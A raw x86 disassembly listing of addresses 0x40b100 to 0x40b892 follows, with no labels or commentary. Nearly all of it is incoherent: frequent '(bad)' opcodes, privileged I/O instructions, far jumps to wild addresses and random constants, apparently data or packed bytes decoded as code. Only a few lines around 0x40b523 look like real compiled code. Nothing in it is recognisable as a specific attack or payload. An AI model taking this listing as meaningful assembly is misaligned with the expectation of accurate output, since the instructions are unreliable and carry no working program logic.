  40b100:	int    0x9f
  40b102:	add    eax,0x3be1d1ee
  40b107:	inc    edx
  40b108:	outs   dx,DWORD PTR ds:[esi]
  40b109:	xor    eax,0xb600f4
  40b10e:	or     ecx,DWORD PTR [esi+0x3]
  40b111:	mov    edx,0x37580724
  40b116:	push   cs
  40b117:	rcr    al,1
  40b119:	mov    bl,0x3d
  40b11b:	inc    dh
  40b11d:	add    ah,0x9c
  40b120:	mov    al,es:0x1d21fc31
  40b126:	jno    0x40b0fe
  40b128:	js     0x40b0fc
  40b12a:	lds    edx,FWORD PTR [ebx+0x1]
  40b12d:	dec    ebx
  40b12e:	cmp    eax,0xaa961a0d
  40b133:	push   es
  40b134:	outs   dx,BYTE PTR ds:[esi]
  40b135:	adc    BYTE PTR ss:[esi],dl
  40b138:	xchg   ebx,eax
  40b139:	cmp    eax,0xea2dd289
  40b13e:	mov    eax,0x935f80c3
  40b143:	pop    edx
  40b144:	clc    
  40b145:	cs xchg edi,eax
  40b147:	ss inc edi
  40b149:	push   0x9a2469de
  40b14e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b14f:	cdq    
  40b150:	jge    0x40b14e
  40b152:	ror    BYTE PTR [ebx],0x20
  40b155:	popa   
  40b156:	dec    ecx
  40b157:	jnp    0x40b0f9
  40b159:	ficom  DWORD PTR [ecx-0x1b653ba5]
  40b15f:	lea    eax,[ebx]
  40b161:	shr    ecx,1
  40b163:	mov    ecx,0xd2000003
  40b168:	jne    0x40b1a1
  40b16a:	sub    esi,DWORD PTR [ebx-0x188a2d97]
  40b170:	retf   0xa792
  40b173:	fs jle 0x40b14b
  40b176:	lahf   
  40b177:	mov    ds:0x9f7070fa,al
  40b17c:	jge    0x40b1ee
  40b17e:	jo     0x40b1a6
  40b180:	(bad)  
  40b181:	push   esi
  40b182:	hlt    
  40b183:	xor    al,0x29
  40b185:	mov    ecx,0x72fb2811
  40b18a:	sub    esi,eax
  40b18c:	pop    eax
  40b18d:	mov    al,ds:0xd8c11d66
  40b192:	jbe    0x40b175
  40b194:	dec    edi
  40b195:	and    al,0xab
  40b197:	imul   esp,DWORD PTR [edi],0x24dba6f4
  40b19d:	or     ch,0xbc
  40b1a0:	push   0xd240b49b
  40b1a5:	xchg   ecx,edx
  40b1a7:	adc    ch,BYTE PTR [edi-0x23dbb743]
  40b1ad:	adc    DWORD PTR [ebx-0x27],ebp
  40b1b0:	xor    al,0x76
  40b1b2:	mov    edx,0xca6597d0
  40b1b7:	in     al,0x7d
  40b1b9:	sub    DWORD PTR [ecx-0x2f],esp
  40b1bc:	pusha  
  40b1bd:	add    ecx,DWORD PTR [ecx-0x792c1beb]
  40b1c3:	test   DWORD PTR [ebx-0x79],ebx
  40b1c6:	jp     0x40b1e3
  40b1c8:	sbb    eax,0x61f8686c
  40b1cd:	mov    DWORD PTR [edi-0x60],edx
  40b1d0:	into   
  40b1d1:	dec    esp
  40b1d2:	mov    al,0xe0
  40b1d4:	imul   esi,DWORD PTR [ebx+0x66dea4c4],0x50
  40b1db:	imul   BYTE PTR [ebx-0x4e]
  40b1de:	jp     0x40b183
  40b1e0:	jne    0x40b197
  40b1e2:	mov    ecx,0xdb346add
  40b1e7:	push   ecx
  40b1e8:	sub    al,0xd2
  40b1eb:	cmp    DWORD PTR [ebp-0x454a26f0],0x2deaf1fd
  40b1f5:	int3   
  40b1f6:	push   eax
  40b1f7:	mov    edx,?
  40b1f9:	popa   
  40b1fa:	dec    esp
  40b1fb:	mov    al,ds:0x4c54d227
  40b200:	xor    eax,0xce1de71f
  40b205:	push   ss
  40b206:	fld    st(4)
  40b208:	jl     0x40b233
  40b20a:	leave  
  40b20b:	sbb    eax,0x5e24d30d
  40b210:	lahf   
  40b211:	mov    ebx,0xc4219b52
  40b216:	lods   al,BYTE PTR ds:[esi]
  40b217:	mov    edi,DWORD PTR [edi+0x66]
  40b21a:	les    esi,FWORD PTR [ebp-0x4d]
  40b21d:	pop    esp
  40b21e:	and    DWORD PTR [eax-0x2c],esp
  40b221:	and    al,0x5
  40b223:	inc    ebx
  40b224:	in     al,dx
  40b225:	push   0x1d
  40b227:	pushf  
  40b228:	pop    ds
  40b229:	rcr    DWORD PTR [ecx-0x7032ecdd],cl
  40b22f:	jge    0x40b23c
  40b231:	mov    ds:0xadd079f3,al
  40b236:	push   0xffffff83
  40b238:	leave  
  40b239:	cmp    ebp,edi
  40b23b:	daa    
  40b23c:	pop    edx
  40b23d:	cmp    edi,eax
  40b23f:	fld    TBYTE PTR [esp+ebp*4+0x1e]
  40b243:	pop    ebp
  40b244:	push   edi
  40b245:	lea    edi,[ebp-0x4e]
  40b248:	icebp  
  40b249:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b24a:	stos   DWORD PTR es:[edi],eax
  40b24b:	cmp    ah,BYTE PTR ds:0xa0079cfe
  40b251:	clc    
  40b252:	mov    dh,0x29
  40b254:	in     al,dx
  40b255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b256:	mov    ah,0x3
  40b258:	cdq    
  40b259:	test   BYTE PTR [edi],al
  40b25b:	ins    BYTE PTR es:[edi],dx
  40b25c:	jmp    0xa34:0x826c5652
  40b263:	repz push es
  40b265:	test   eax,0x1ed36e
  40b26a:	inc    esp
  40b26b:	dec    eax
  40b26c:	dec    ebx
  40b26d:	mov    dh,0xea
  40b26f:	adc    esi,DWORD PTR [edi+0x4890fc92]
  40b275:	retf   
  40b276:	and    eax,0x5cf4076d
  40b27b:	add    al,0x19
  40b27d:	imul   ebx,DWORD PTR [edx-0x6dc1d0c2],0x398e1508
  40b287:	push   ebp
  40b288:	sbb    DWORD PTR [ebp-0x45],ecx
  40b28b:	push   esi
  40b28c:	push   ebx
  40b28d:	loope  0x40b2ae
  40b28f:	cld    
  40b290:	out    dx,al
  40b291:	jbe    0x40b2ee
  40b293:	cmp    ebx,0x55
  40b296:	push   esp
  40b297:	jecxz  0x40b263
  40b299:	stos   BYTE PTR es:[edi],al
  40b29a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b29b:	ret    0xb27b
  40b29e:	mov    ss,WORD PTR [edi-0xe9dbb97]
  40b2a4:	xor    al,0xb6
  40b2a6:	xor    DWORD PTR [edx],edx
  40b2a8:	adc    DWORD PTR [ecx-0x17fe66b4],0xfffffffc
  40b2af:	shr    DWORD PTR gs:[ebx+0x65],0xf9
  40b2b4:	in     eax,0xab
  40b2b6:	push   esi
  40b2b7:	aas    
  40b2b8:	or     al,0x14
  40b2ba:	pop    es
  40b2bb:	retf   
  40b2bc:	ja     0x40b322
  40b2be:	jno    0x40b272
  40b2c0:	cmp    DWORD PTR [edi-0x35],ebp
  40b2c3:	call   0xb858:0xdf01af95
  40b2ca:	inc    ebp
  40b2cb:	jne    0x40b2bd
  40b2cd:	aad    0x77
  40b2cf:	push   ds
  40b2d0:	xchg   ebp,eax
  40b2d1:	test   al,0x79
  40b2d3:	inc    esi
  40b2d4:	cli    
  40b2d5:	lea    edi,[edi-0x56]
  40b2d8:	push   ecx
  40b2d9:	push   esi
  40b2da:	add    ch,BYTE PTR [edx+0x2]
  40b2dd:	sub    ebx,edx
  40b2df:	push   es
  40b2e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2e1:	int    0x8b
  40b2e3:	cmp    esp,DWORD PTR [edx+0x55]
  40b2e6:	adc    DWORD PTR [eax+0x3a],edx
  40b2e9:	sahf   
  40b2ea:	pop    ss
  40b2eb:	popa   
  40b2ec:	mov    ebp,0xdbdaa4e7
  40b2f1:	aad    0xf0
  40b2f3:	data16 in al,0xa6
  40b2f6:	sub    esi,DWORD PTR [ebx+0x9]
  40b2f9:	push   edi
  40b2fa:	push   ebx
  40b2fb:	or     ecx,DWORD PTR [edi-0x610fd4d4]
  40b301:	pushf  
  40b302:	sub    al,0x1a
  40b304:	fdivr  QWORD PTR [edx+0x3e]
  40b307:	sahf   
  40b308:	jmp    0xefa33531
  40b30d:	and    cl,ch
  40b30f:	add    ebp,esp
  40b311:	cmp    al,0x13
  40b313:	fcmovne st,st(1)
  40b315:	pop    ebp
  40b316:	ret    0xacdb
  40b319:	imul   ebp,edx,0xffffffb3
  40b31c:	lds    ecx,FWORD PTR [ebx+0x9]
  40b31f:	fidivr WORD PTR [esi]
  40b321:	cdq    
  40b322:	mov    DWORD PTR ds:0x8430283,eax
  40b328:	dec    esi
  40b329:	(bad)  
  40b32a:	jae    0x40b304
  40b32c:	pusha  
  40b32d:	popa   
  40b32e:	mov    dh,al
  40b330:	mul    ah
  40b332:	inc    esp
  40b333:	inc    ecx
  40b334:	div    DWORD PTR [ebx+0x10]
  40b337:	or     DWORD PTR [ecx-0x18e3a9ce],0x61
  40b33e:	sub    ebx,DWORD PTR [ecx+esi*1-0xb]
  40b342:	xor    eax,0x4a2c0b4f
  40b347:	shr    al,cl
  40b349:	sub    ch,al
  40b34b:	add    bh,BYTE PTR [ebx-0x47]
  40b34e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b34f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b350:	stos   DWORD PTR es:[edi],eax
  40b351:	and    eax,0xb1a84c61
  40b356:	into   
  40b357:	cld    
  40b358:	and    eax,0x907bc420
  40b35d:	stos   BYTE PTR es:[edi],al
  40b35e:	sar    DWORD PTR ds:0x8a8c06e0,cl
  40b364:	jmp    0xb44a7355
  40b369:	cmc    
  40b36a:	sub    ch,BYTE PTR [ebx]
  40b36c:	imul   esp,DWORD PTR [ecx+0x48],0x29
  40b370:	imul   ecx,edx,0x23
  40b373:	push   esp
  40b374:	jnp    0x40b37b
  40b376:	shl    BYTE PTR [edi-0x6afc28d4],1
  40b37c:	sub    BYTE PTR [ecx],bl
  40b37e:	jecxz  0x40b37c
  40b380:	fnstsw WORD PTR [edi+edi*1-0x55156d4a]
  40b387:	repz arpl sp,bx
  40b38a:	ret    0xaab5
  40b38d:	mov    eax,ds:0xaa95e5a4
  40b392:	mov    eax,ds:0x55968145
  40b397:	mov    ds:0x136e3c57,al
  40b39c:	add    edi,DWORD PTR [ebx+0xbaf2fea]
  40b3a2:	iret   
  40b3a3:	shr    dh,0x0
  40b3a6:	enter  0xd79b,0x12
  40b3aa:	xchg   ecx,eax
  40b3ab:	pushf  
  40b3ac:	jl     0x40b3f8
  40b3ae:	dec    esp
  40b3af:	enter  0xc97d,0x24
  40b3b3:	lahf   
  40b3b4:	mov    bh,0x83
  40b3b6:	lods   eax,DWORD PTR ds:[esi]
  40b3b7:	call   0x26a79c34
  40b3bc:	repz xchg esp,eax
  40b3be:	xor    ebp,esp
  40b3c0:	sub    BYTE PTR [ecx+eax*4-0x62],0x54
  40b3c5:	lods   al,BYTE PTR ds:[esi]
  40b3c6:	cmp    edx,DWORD PTR [edi-0x221ecf3c]
  40b3cc:	repnz mov eax,0xb7b963f4
  40b3d2:	retf   
  40b3d3:	or     BYTE PTR [ebx+ebp*4-0x79],cl
  40b3d7:	loope  0x40b375
  40b3d9:	out    0xc4,eax
  40b3db:	test   DWORD PTR [ebx+ecx*1+0x36a44636],ebx
  40b3e2:	cmp    DWORD PTR [ecx+0x59801f13],edi
  40b3e8:	loop   0x40b3b7
  40b3ea:	ficom  WORD PTR [ebx]
  40b3ec:	dec    ecx
  40b3ed:	mov    WORD PTR [edi],es
  40b3ef:	and    DWORD PTR [ecx+0x1e541d00],0x5
  40b3f6:	mov    ecx,0xf64a4079
  40b3fb:	sbb    eax,0xd9beb57a
  40b400:	retf   
  40b401:	cld    
  40b402:	sbb    DWORD PTR [esi-0x43],0x27
  40b406:	mov    dh,0xe1
  40b408:	xor    eax,0x977661f9
  40b40d:	lahf   
  40b40e:	sub    ebx,DWORD PTR ss:[ebx]
  40b411:	push   ss
  40b412:	sbb    DWORD PTR [edx+eax*8],eax
  40b415:	push   esp
  40b416:	xchg   dl,dl
  40b418:	xor    al,0xa0
  40b41a:	dec    edx
  40b41b:	ret    0xa331
  40b41e:	cwde   
  40b41f:	in     al,dx
  40b420:	push   cs
  40b421:	popa   
  40b422:	fisub  DWORD PTR [ecx+0x55730442]
  40b428:	lds    ecx,FWORD PTR [eax]
  40b42a:	jae    0x40b3e4
  40b42c:	pusha  
  40b42d:	fst    QWORD PTR [eax+ecx*1+0x5b]
  40b431:	xchg   esi,eax
  40b432:	lods   al,BYTE PTR ds:[esi]
  40b433:	push   ebx
  40b434:	sub    DWORD PTR [edx+0x13],eax
  40b437:	xlat   BYTE PTR ds:[ebx]
  40b438:	push   0x22c69d0f
  40b43d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b43e:	push   esi
  40b43f:	sub    DWORD PTR ds:[edi+0xb],ecx
  40b443:	sub    esi,edi
  40b445:	or     al,BYTE PTR cs:[edx+edi*4-0x1f]
  40b44a:	int    0x5f
  40b44c:	push   ds
  40b44d:	repnz fistp DWORD PTR [edi-0x55]
  40b451:	xor    eax,0xddc536c8
  40b456:	cmp    ecx,DWORD PTR [edi-0x72]
  40b459:	sub    BYTE PTR [esi+ebp*1+0x7],0x5e
  40b45e:	shl    ebp,cl
  40b460:	adc    eax,ecx
  40b462:	and    bh,bh
  40b464:	or     DWORD PTR [ecx+0x373718b2],esi
  40b46a:	arpl   WORD PTR [edi-0x1e],bp
  40b46d:	call   0x5bb00d5d
  40b472:	mov    esp,0x3ac57162
  40b477:	cmp    BYTE PTR [ecx+0x4a767037],0x3c
  40b47e:	(bad)  
  40b47f:	mov    esp,0x1773a20e
  40b484:	xchg   edx,eax
  40b485:	loopne 0x40b4c1
  40b487:	adc    DWORD PTR [esi],ebp
  40b489:	push   esp
  40b48a:	std    
  40b48b:	ins    DWORD PTR es:[edi],dx
  40b48c:	adc    cl,BYTE PTR [ecx-0x6f]
  40b48f:	call   0x5090:0x6505eb4a
  40b496:	sub    BYTE PTR gs:[edi-0x49],ah
  40b49a:	cli    
  40b49b:	jb     0x40b45e
  40b49d:	pop    ds
  40b49e:	jmp    DWORD PTR [edx+0x3bb7a051]
  40b4a4:	aad    0x65
  40b4a6:	js     0x40b471
  40b4a8:	xchg   DWORD PTR [edx+0x43],ecx
  40b4ab:	xor    ah,BYTE PTR [edi]
  40b4ad:	pop    ss
  40b4ae:	ror    BYTE PTR [esi-0x21f029be],1
  40b4b4:	xchg   esp,eax
  40b4b5:	push   ebp
  40b4b6:	int    0x63
  40b4b8:	imul   ebx,DWORD PTR ds:0x75eb263c,0xbc8460e8
  40b4c2:	inc    ecx
  40b4c3:	(bad)  
  40b4c4:	in     eax,dx
  40b4c5:	popf   
  40b4c6:	fwait
  40b4c7:	(bad)  
  40b4c8:	jbe    0x40b4d2
  40b4ca:	sbb    eax,0x4a04fdfd
  40b4cf:	dec    esi
  40b4d0:	aaa    
  40b4d1:	dec    edi
  40b4d2:	cmc    
  40b4d3:	mul    BYTE PTR [edi-0x4674ac60]
  40b4d9:	cdq    
  40b4da:	mov    cl,BYTE PTR [edi+0x7474b010]
  40b4e0:	ror    ah,cl
  40b4e2:	and    ah,BYTE PTR [ebp+0x23]
  40b4e5:	push   cs
  40b4e6:	xlat   BYTE PTR ds:[ebx]
  40b4e7:	push   ss
  40b4e8:	bound  esp,QWORD PTR [esi]
  40b4ea:	mov    dl,0xac
  40b4ec:	ss push esp
  40b4ee:	gs ins BYTE PTR es:[edi],dx
  40b4f0:	enter  0xc377,0xdd
  40b4f4:	sti    
  40b4f5:	xchg   DWORD PTR ds:0xbbbd0381,esi
  40b4fb:	xchg   esp,eax
  40b4fc:	dec    edx
  40b4fd:	adc    al,0x1a
  40b4ff:	imul   DWORD PTR [edx]
  40b501:	aaa    
  40b502:	jmp    0x40b51b
  40b504:	cmc    
  40b505:	adc    bl,BYTE PTR [ebp+0x7a]
  40b508:	push   ds
  40b509:	inc    edx
  40b50a:	cmp    eax,0xf623f8a4
  40b50f:	nop
  40b510:	inc    ebx
  40b511:	imul   eax,esi,0xc3d5bcb6
  40b517:	mov    ebp,0xf0054183
  40b51c:	mov    ebx,0xfdc11bb
  40b521:	scas   eax,DWORD PTR es:[edi]
  40b522:	xlat   BYTE PTR ds:[ebx]
  40b523:	mov    edi,DWORD PTR [ebp-0x8]
  40b526:	mov    ebx,DWORD PTR [ebp-0x10]
  40b529:	sub    ebx,edi
  40b52b:	cmp    ebx,edx
  40b52d:	ja     0x40b53b
  40b533:	mov    edx,DWORD PTR [ebp-0x2c]
  40b536:	jmp    0x40c0ee
  40b53b:	mov    edx,DWORD PTR [ebp-0x34]
  40b53e:	jmp    0x40b8fc
  40b543:	cmp    eax,0x7178931c
  40b548:	mov    bh,0x49
  40b54a:	loope  0x40b546
  40b54c:	loop   0x40b5b2
  40b54e:	pop    edx
  40b54f:	shl    BYTE PTR [edx-0x22],0x17
  40b553:	rol    DWORD PTR [esi+0x7d9f7070],0x70
  40b55a:	jo     0x40b532
  40b55c:	cmp    esi,0xeccfa1b4
  40b562:	and    edx,DWORD PTR ds:0xf75a5223
  40b568:	xchg   edi,eax
  40b569:	sub    edx,edx
  40b56b:	das    
  40b56c:	icebp  
  40b56d:	or     ah,BYTE PTR [ebp-0x1]
  40b570:	cmp    eax,0xf7230d08
  40b575:	cs pop eax
  40b577:	and    ecx,eax
  40b579:	bound  esp,QWORD PTR [esi-0x24]
  40b57c:	repz dec esp
  40b57e:	jmp    0x40b5f9
  40b580:	jecxz  0x40b587
  40b582:	(bad)  
  40b583:	in     al,0x2
  40b585:	stos   DWORD PTR es:[edi],eax
  40b586:	stos   DWORD PTR es:[edi],eax
  40b587:	adc    bl,BYTE PTR [eax+0x6688d840]
  40b58d:	sbb    al,BYTE PTR [edi+ecx*4]
  40b590:	scas   al,BYTE PTR es:[edi]
  40b591:	dec    esi
  40b592:	cwde   
  40b593:	sub    edx,DWORD PTR [ebx+0x5ccf4e3e]
  40b599:	adc    eax,0xaec27ff0
  40b59e:	xor    bl,BYTE PTR [edi+0x63]
  40b5a1:	pop    es
  40b5a2:	inc    ebx
  40b5a3:	fcom   st(7)
  40b5a5:	rol    BYTE PTR [edi+0x5a70471a],0xc6
  40b5ac:	mov    ebp,0x6d92930f
  40b5b1:	icebp  
  40b5b2:	jo     0x40b5a4
  40b5b4:	jp     0x40b60f
  40b5b6:	ret    
  40b5b7:	ins    BYTE PTR es:[edi],dx
  40b5b8:	mov    bh,0xc
  40b5ba:	jmp    0xb457952f
  40b5bf:	neg    DWORD PTR [ecx+0x2fff1126]
  40b5c5:	cmp    BYTE PTR [edi],bl
  40b5c7:	jecxz  0x40b5d3
  40b5c9:	or     bl,BYTE PTR [edi+0x3d]
  40b5cc:	push   ecx
  40b5cd:	pop    es
  40b5ce:	add    DWORD PTR [eax],edx
  40b5d0:	leave  
  40b5d1:	adc    dh,BYTE PTR [eax-0x5631be98]
  40b5d7:	push   edx
  40b5d8:	mov    ah,0x4f
  40b5da:	aam    0xd4
  40b5dc:	add    DWORD PTR [ebp+0x53],edi
  40b5df:	popf   
  40b5e0:	in     al,0xb3
  40b5e2:	xor    DWORD PTR [esi+0x2d],edi
  40b5e5:	mov    DWORD PTR [esi+0x31],edx
  40b5e8:	aam    0x40
  40b5ea:	fnstcw WORD PTR [esi+0x4c]
  40b5ed:	xor    ah,BYTE PTR [edx+0x78]
  40b5f0:	xchg   DWORD PTR [eax-0x763b1048],ebp
  40b5f6:	push   0x56422445
  40b5fb:	xchg   ebx,eax
  40b5fc:	aas    
  40b5fd:	jne    0x40b65b
  40b5ff:	nop
  40b600:	shl    DWORD PTR [edx-0x52182931],0x3
  40b607:	or     ebp,DWORD PTR [ecx-0x6a048966]
  40b60d:	adc    bh,0x28
  40b610:	jp     0x40b612
  40b612:	shl    BYTE PTR [eax],1
  40b614:	inc    ebp
  40b615:	mov    ds:0xb79d5238,al
  40b61a:	or     al,0x1
  40b61c:	in     al,0x2d
  40b61e:	retf   0x4e22
  40b621:	dec    edx
  40b622:	pop    ecx
  40b623:	scas   al,BYTE PTR es:[edi]
  40b624:	lds    edx,FWORD PTR [eax-0x9]
  40b627:	and    eax,0x4c689222
  40b62c:	cwde   
  40b62d:	ret    
  40b62e:	jp     0x40b630
  40b630:	imul   ebx,DWORD PTR ds:0x77b53a31,0x2699e26b
  40b63a:	(bad)  
  40b63b:	fisubr DWORD PTR [esi-0x146ff04c]
  40b641:	add    dl,ch
  40b643:	pop    ecx
  40b644:	sub    edi,edx
  40b646:	xchg   ebx,eax
  40b647:	retf   0x99fa
  40b64a:	je     0x40b5e5
  40b64c:	inc    esp
  40b64d:	xchg   esi,eax
  40b64e:	pop    ebp
  40b64f:	adc    dl,cl
  40b651:	push   eax
  40b652:	xor    dh,dl
  40b654:	sbb    eax,0xfdf1821f
  40b659:	cmp    ch,BYTE PTR [esi]
  40b65b:	out    0xa4,eax
  40b65d:	(bad)  
  40b65e:	adc    DWORD PTR [eax-0x32],ebx
  40b661:	out    0xcd,eax
  40b663:	mov    edi,0xb1cbe31e
  40b668:	pop    esp
  40b669:	or     cl,al
  40b66b:	push   0x40
  40b66d:	call   0x452d:0x49fcaf04
  40b674:	stos   DWORD PTR es:[edi],eax
  40b675:	jo     0x40b64e
  40b677:	cmp    al,0x17
  40b679:	aaa    
  40b67a:	fwait
  40b67b:	push   ss
  40b67c:	xchg   esp,eax
  40b67d:	fs aam 0x60
  40b680:	cmp    esi,DWORD PTR [ecx]
  40b682:	mov    al,ds:0xd08eaa6d
  40b687:	cld    
  40b688:	out    0x9f,eax
  40b68a:	pop    ds
  40b68b:	sub    esp,DWORD PTR [edi-0x1eeb7927]
  40b691:	mov    ebx,0xca778178
  40b696:	enter  0x7a04,0xcf
  40b69a:	mov    edi,0x63a5fef9
  40b69f:	inc    edx
  40b6a0:	xchg   edx,eax
  40b6a1:	std    
  40b6a2:	jae    0x40b6ea
  40b6a4:	(bad)  
  40b6a5:	cld    
  40b6a6:	in     al,dx
  40b6a7:	call   0x1e0524f8
  40b6ac:	fwait
  40b6ad:	out    dx,al
  40b6ae:	into   
  40b6af:	dec    edx
  40b6b0:	dec    eax
  40b6b1:	lods   al,BYTE PTR ds:[esi]
  40b6b2:	loopne 0x40b6c3
  40b6b4:	mov    ds:0xb3dd4c88,al
  40b6b9:	mov    ebx,0xf51449af
  40b6be:	pushf  
  40b6bf:	clc    
  40b6c0:	call   0xd219:0x2c2484b4
  40b6c7:	outs   dx,DWORD PTR ds:[esi]
  40b6c8:	mov    dl,0xc6
  40b6ca:	(bad)  
  40b6cb:	push   esi
  40b6cc:	aas    
  40b6cd:	pop    esi
  40b6ce:	cld    
  40b6cf:	cmp    DWORD PTR [edi-0xae90b77],0x4564908
  40b6d9:	adc    ax,0x9fcb
  40b6dd:	es popa 
  40b6df:	jne    0x40b678
  40b6e1:	cld    
  40b6e2:	loope  0x40b728
  40b6e4:	adc    al,0x80
  40b6e6:	push   esp
  40b6e7:	cmp    edi,edx
  40b6e9:	mov    bh,0x74
  40b6eb:	cmp    al,BYTE PTR ds:0x5eb8d40f
  40b6f1:	mov    ecx,0x4259263a
  40b6f6:	retf   0x69b2
  40b6f9:	push   edx
  40b6fa:	test   al,0x4d
  40b6fc:	enter  0xc915,0x74
  40b700:	mov    ds:0x82dfae61,eax
  40b705:	je     0x40b71e
  40b707:	ret    
  40b708:	cmp    DWORD PTR [edx-0x255319b3],ebx
  40b70e:	jl     0x40b787
  40b710:	push   esp
  40b711:	sar    DWORD PTR [eax],1
  40b713:	mov    eax,ds:0xaced0d84
  40b718:	jnp    0x40b69c
  40b71a:	pop    eax
  40b71b:	and    eax,0x3160f202
  40b720:	daa    
  40b721:	repz int 0x7
  40b724:	shl    BYTE PTR [ebx],1
  40b726:	push   ebx
  40b727:	arpl   WORD PTR [eax-0x3],dx
  40b72a:	jb     0x40b74b
  40b72c:	mov    bl,0xca
  40b72e:	push   ecx
  40b72f:	adc    ah,BYTE PTR [edx]
  40b731:	xchg   edx,eax
  40b732:	pop    edi
  40b733:	dec    ecx
  40b734:	pop    esi
  40b735:	sahf   
  40b736:	std    
  40b737:	push   ecx
  40b738:	add    ebx,DWORD PTR [ebp-0x68]
  40b73b:	fsubrp st(5),st
  40b73d:	xor    al,0x1a
  40b73f:	xchg   DWORD PTR [esi-0x5130a3c6],edx
  40b745:	xchg   edx,eax
  40b746:	mov    dl,0x4
  40b748:	mov    edi,0xfb39a3df
  40b74d:	push   ebp
  40b74e:	(bad)  
  40b74f:	sbb    ecx,edx
  40b751:	push   0x79
  40b753:	enter  0xe3e2,0xdd
  40b757:	icebp  
  40b758:	loop   0x40b717
  40b75a:	push   es
  40b75b:	leave  
  40b75c:	stos   DWORD PTR es:[edi],eax
  40b75d:	fldcw  WORD PTR [esi-0x43]
  40b760:	xchg   DWORD PTR [edx-0x68],edi
  40b763:	shl    DWORD PTR [esi],cl
  40b765:	or     BYTE PTR [ebx],al
  40b767:	and    al,0x9f
  40b769:	scas   eax,DWORD PTR es:[edi]
  40b76a:	loope  0x40b714
  40b76c:	pop    ss
  40b76d:	mov    edi,0x918e1f75
  40b772:	mov    ebp,DWORD PTR [ecx+0x4c]
  40b775:	data16 add ch,BYTE PTR [esi+0xe]
  40b779:	mov    ds:0xa0eb78e1,eax
  40b77e:	cmp    BYTE PTR [eax],al
  40b780:	and    DWORD PTR [eax+0x1646b4a0],esi
  40b786:	mov    eax,ds:0xde8f2797
  40b78b:	repz jns 0x40b7cb
  40b78e:	ins    DWORD PTR es:[edi],dx
  40b78f:	cmp    DWORD PTR [edi],ebp
  40b791:	rcr    BYTE PTR [ebp-0x5e],0x74
  40b795:	pop    esp
  40b796:	jle    0x40b72a
  40b798:	jo     0x40b7a9
  40b79a:	das    
  40b79b:	sub    eax,0x651c60ba
  40b7a0:	pop    ss
  40b7a1:	pusha  
  40b7a2:	imul   ebp,DWORD PTR [esi+0x43],0xffffffc9
  40b7a6:	add    DWORD PTR [ebp-0x11],ecx
  40b7a9:	mov    dh,0x46
  40b7ab:	out    dx,eax
  40b7ac:	push   ebx
  40b7ad:	repz cs and al,0x21
  40b7b1:	or     BYTE PTR [ecx],ch
  40b7b3:	shr    BYTE PTR es:[ecx-0x33],cl
  40b7b7:	or     eax,0xca337c3c
  40b7bc:	jl     0x40b797
  40b7be:	cmp    ecx,DWORD PTR [eax+0x59fbeecf]
  40b7c4:	xor    esp,0x55ea6493
  40b7ca:	jle    0x40b7e2
  40b7cc:	iret   
  40b7cd:	add    eax,0xb084bb49
  40b7d2:	jae    0x40b7c7
  40b7d4:	push   ebp
  40b7d5:	adc    al,0xb3
  40b7d7:	pop    esi
  40b7d8:	fcompp 
  40b7da:	pop    ebx
  40b7db:	sar    DWORD PTR [ebp+0x1da60e0d],1
  40b7e1:	sub    ah,BYTE PTR [eax-0x5951a2ed]
  40b7e7:	loopne 0x40b838
  40b7e9:	push   edi
  40b7ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7eb:	adc    al,0xb2
  40b7ed:	mov    ecx,0x30b23502
  40b7f2:	rcr    bh,0xa7
  40b7f5:	aam    0xc
  40b7f7:	stos   DWORD PTR es:[edi],eax
  40b7f8:	aaa    
  40b7f9:	inc    ecx
  40b7fa:	dec    ebp
  40b7fb:	stc    
  40b7fc:	inc    ecx
  40b7fd:	(bad)  
  40b7fe:	cli    
  40b7ff:	pop    edi
  40b800:	push   edx
  40b801:	xor    eax,0x4a0243d9
  40b806:	fwait
  40b807:	mov    es,ebx
  40b809:	pop    edi
  40b80a:	not    bh
  40b80c:	aad    0x51
  40b80e:	aas    
  40b80f:	loopne 0x40b869
  40b811:	or     al,0x99
  40b813:	(bad)  
  40b814:	jmp    0x3341:0x362188ee
  40b81b:	mov    ds:0x20aca68a,al
  40b820:	push   edx
  40b821:	jbe    0x40b7b0
  40b823:	scas   eax,DWORD PTR es:[edi]
  40b824:	inc    eax
  40b825:	xchg   esi,eax
  40b826:	arpl   WORD PTR [ebx-0x185bea],dx
  40b82c:	mov    esp,esp
  40b82e:	push   0xffffffcc
  40b830:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b831:	je     0x40b859
  40b833:	lahf   
  40b834:	push   ebx
  40b835:	jp     0x40b814
  40b837:	stc    
  40b838:	loopne 0x40b82f
  40b83a:	mov    ds,WORD PTR [edi-0x6b]
  40b83d:	stos   BYTE PTR es:[edi],al
  40b83e:	sbb    ah,dl
  40b840:	outs   dx,BYTE PTR ds:[si]
  40b842:	add    al,0xc9
  40b844:	inc    esi
  40b845:	in     al,dx
  40b846:	sbb    DWORD PTR [edi],0x4243e80f
  40b84c:	and    dh,BYTE PTR [ecx]
  40b84e:	jl     0x40b842
  40b850:	sti    
  40b851:	iret   
  40b852:	xor    eax,0xaf7208d7
  40b857:	dec    eax
  40b858:	add    DWORD PTR [ebx],esp
  40b85a:	rcl    ecx,0x9b
  40b85d:	lods   eax,DWORD PTR ds:[esi]
  40b85e:	scas   al,BYTE PTR es:[edi]
  40b85f:	sub    DWORD PTR [esi-0x1f29676e],ebx
  40b865:	mov    edx,0x320b5860
  40b86a:	pop    edi
  40b86b:	fcomp  DWORD PTR [ecx-0x7467b771]
  40b871:	(bad)  
  40b872:	xlat   BYTE PTR ds:[ebx]
  40b873:	jmp    0x8223:0xfd75d6c6
  40b87a:	iret   
  40b87b:	pop    ebx
  40b87c:	jmp    DWORD PTR [eax-0x3ee1f0dd]
  40b882:	imul   eax,DWORD PTR [edx],0xa3a14672
  40b888:	out    dx,eax
  40b889:	outs   dx,BYTE PTR ds:[esi]
  40b88a:	jl     0x40b908
  40b88c:	lods   al,BYTE PTR ds:[esi]
  40b88d:	mov    ebp,0x15a10d7
  40b892:	cmp    ebp,DWORD PTR ds:0x9310aa71
